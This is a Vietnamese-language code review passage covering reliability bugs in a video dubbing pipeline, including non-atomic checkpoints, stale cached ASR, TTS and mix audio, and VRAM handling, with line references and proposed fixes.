- **M10** `audio.wav` trích dở bị dùng lại âm thầm; mỗi engine ASR có luật dùng lại riêng (`asr.py:45-55, 172`, `fun_asr_nano.py:484` dùng lại cả khi force, `sensevoice_asr.py:140`, `paraformer_zh.py:121`, `firered_asr.py:195`). **Sửa:** 1 hàm `ensure_audio_wav` ghi `.tmp` → `os.replace`, so thời lượng với video ±1 s, kiểm marker sửa mốc.
- **M11** Checkpoint JSON không ghi atomic và resume lỗi thì im lặng làm lại từ đầu: `asr.py:234` (ghi cả `asr.json` mỗi 1,5 s) + `:150` (`except: rows=[]`), `translate.py:1757` + `:1631`; `dub_fit.wav` ghi tại chỗ (`assemble.py:289`) trong khi `.fit_mode` cũ còn → file dở được coi là hợp lệ. **Sửa:** `atomic_write_json` dùng chung; `dub_fit.partial.wav`; checkpoint hỏng → đọc `.bak`.
- **M12** TTS resume chỉ theo chỉ số: `clone_tts.py:446-451, 338-350` nhận `seg_{i}.wav` nếu engine khớp, không so text/giọng → sửa bản dịch / đổi giọng / `resplit_subs` đánh số lại vẫn dùng clip cũ. **Sửa:** hash `(vi, voice, engine, speed)` mỗi clip.
- **M13** `mixed_audio.wav` dùng lại khi đổi thiết lập trộn: `render.py:2157-2172` chỉ so mtime với `dub` → đổi `audio_mode`/`orig_vol`/BGM vẫn ra bản trộn cũ dù nhãn báo mode mới. **Sửa:** `mixed_audio.json` lưu filter + mtime input.
- **M14** Nano bỏ slice lỗi không log (`fun_asr_nano.py:345-363`), kể cả CUDA OOM → mất thoại im lặng; VAD rỗng thì chạy cả file 10 h (`518-523`) → OOM/treo. **Sửa:** đếm + log, OOM thì `empty_cache` thử lại 1 lần, fail nếu mất > N% thời lượng thoại.
- **M15** Hybrid ASR luôn `force=True` cho Nano/Paraformer (`hybrid_asr.py:83-91`) → crash ở bước align chạy lại hàng giờ Nano.
- **M16** `vram.py`: chỉ dừng Ollama, không có gì quản lý VRAM của llama-server; `ipc_collect()` tạo CUDA context trong server (trùng S12).

### P2
- Padding slice Nano 0,85 s/bên kéo thoại kề vào → lặp chữ ở biên (`asr_vad_utils.py:27-29, 110-111`); FireRed cắt cứng 20 phút không overlap (`firered_asr.py:260-273`).
- Render chia khúc chỉ cho chế độ duck (cần `mixed_audio`), `voice_only`/`voice_bgm` không được tăng tốc; 1 khúc lỗi xoá hết khúc đã xong (`render.py:2650, 575-590`).
- Fallback x264 vẫn giữ `-hwaccel cuda` (`render.py:739-753`) → nếu NVENC lỗi do OOM thì retry vẫn decode trên CUDA.
- Helper trùng: logic tách sub 2 lần trong `run_render` (`2415-2455`, `2481-2510`), parser box MP4 2 bản (`render.py:272-325`, `media_ts.py:31-88`), `_probe_dur`/`_find_video` 3–4 bản.
- `mux.py` cũ dùng chung tên stage `mux`; kiểm `Path(st.get(key,"")).exists()` luôn True vì `Path("")` = `.` (`mux.py:77-80`, `asr.py:122`, `separate.py:67`, `hybrid_asr.py:69`).
- `translate.py`: `except ValueError` thứ 2 không bao giờ chạy (`1494-1499`); chỉ số LLM trả về không đối chiếu tập yêu cầu (`1212-1215`) → lệch dòng zh/vi; hack riêng 1 bộ phim áp cho mọi job (`914-924`).
- OCR decode keyframe 2 lần, ghép thời gian theo chỉ số (`ocr.py:85-107`); `assemble.py:51-64` spawn 1 ffmpeg / clip nén, tuần tự, không timeout.

### Nhận xét kiến trúc (media)
- Không có lớp helper chung cho "trích audio / probe / ghi atomic / giải phóng GPU" → mỗi stage tự làm theo luật riêng (M10, M11, helper trùng).
- Liên kết ASR ↔ script ↔ TTS bằng chỉ số `i` (đổi khi tách lại), không hash nội dung → resume / tách lại / TTS lại một phần không an toàn (M12, M13).
- Dịch, tách nhạc, render, assemble chạy trong tiến trình server → crash và VRAM không cách ly (ASR/TTS đã là subprocess).
- Filter graph ghép chuỗi tay; thiếu builder kiểm độ sâu/độ dài biểu thức (M3).
- Không có test cho toán quan trọng: `compute_fit_placements`, `chunk_cuts`, `_hardsub_track_boxes`/`_stretch_track_filter`, `audio_drift_points`/`make_retime`.

### Quick wins (media)
1. `assemble.py:314` cắt `dur/ratio` (M5).
2. `_translate_safe` ném lại lỗi transport thay vì chia đôi lô (M7).
3. `atomic_write_json` dùng chung cho `asr.json`, `script.json`, `tts.json`, retime `media_ts` (M11, M2).
4. `vram.py` bỏ `ipc_collect`, chỉ `empty_cache` khi `torch.cuda.is_initialized()` (M16/S12).
5. `-rf64 auto` cho output PCM + Demucs `--flac` (M4).

### Bổ sung 07/10 (từ bản review media thứ 2, chưa ghi ở trên)

Đã đối chiếu lại với code sau đợt 7: M17, M19, M20 vẫn còn nguyên. M18, M21–M23 chưa kiểm lại.

- **M17 (P1)** Soát bản dịch đánh `rv = 1` cho cả lô khi gọi LLM lỗi hoặc trả rỗng (`translate.py:1349-1355`) → "Tiếp tục" không soát lại, UI báo đã soát xong. **Sửa:** chỉ đặt `rv` khi gọi + parse thành công; tách "không cần sửa" khỏi "gọi lỗi".
- **M18 (P1)** TTS resume khôi phục `seg_XXXX.wav` từ đĩa sau khi bị kill nhưng không chạy hậu xử lý (đổi tốc độ, cắt onset OmniVoice) — chỉ clip `todo` mới được xử lý (`clone_tts.py:451, 484`). **Sửa:** worker ghi `.raw.wav`, hậu xử lý xong mới đổi tên sang tên cuối.
- **M19 (P1)** Dò hardsub lấy mẫu thưa với file dài: `stride = max(20, dur/300)` (`render.py:1329`) ≈ 168 s cho phim 14 h, tập phim ngắn 1–3 phút có thể không có mẫu nào → dải chữ Trung ở độ cao khác không bị che. **Sửa:** mẫu theo thời lượng (20–30 s/mẫu) và thêm mẫu ngay sau mỗi chỗ nối tập (`media_ts.audio_drift_points()` có sẵn vị trí nối).
- **M20 (P2) — ĐÃ SỬA 07/10** (`fixes/2026-10-07-m20-voice-bgm-apad.md`) `voice_bgm`: `amix=duration=first` với giọng Việt đứng đầu, không `apad` (`render.py:2326`) → nhạc nền và audio dừng ở câu thoại cuối, phần kết phim im lặng. Batch hiện dùng `duck` nên chưa dính. **Sửa:** `apad` cho dub như `voice_only`, để `-t` cắt.
- **M21 (P1)** `heal_script_broken_numbers` gộp 2 dòng giữ `i` đầu; lần chạy dịch không force sau đó coi `i` bị gộp là "thiếu" → dịch lại và chèn lại → nửa sau con số lặp 2 lần trong sub/TTS (`subs.py:799-803`, `translate.py:1703-1706, 1727, 1878-1883`). **Sửa:** ghi `merged_from` trên dòng còn lại và coi là đã xong khi resume.
- **M22 (P2)** `media_ts.py:104`: `stts` rỗng (MP4 fragmented) → `max()` trên list rỗng → render crash.
- **M23 (P2)** `_esc` đổi `%` thành `\%` (`render.py:846`), có thể drawtext vẫn nhận `%` trần và báo "Stray %" khi chữ overlay có dấu % (chưa thử thật). **Sửa:** `text_file=` + `expansion=none`.

Các mục media được thêm vào lộ trình: **đợt 1** thêm M2, M5; **đợt 3** thêm M7, M8, M9; **đợt 4** thêm M10, M11, M12, M13; **đợt 6** thêm M3 (test + builder), test toán fit/chunk/hardsub.
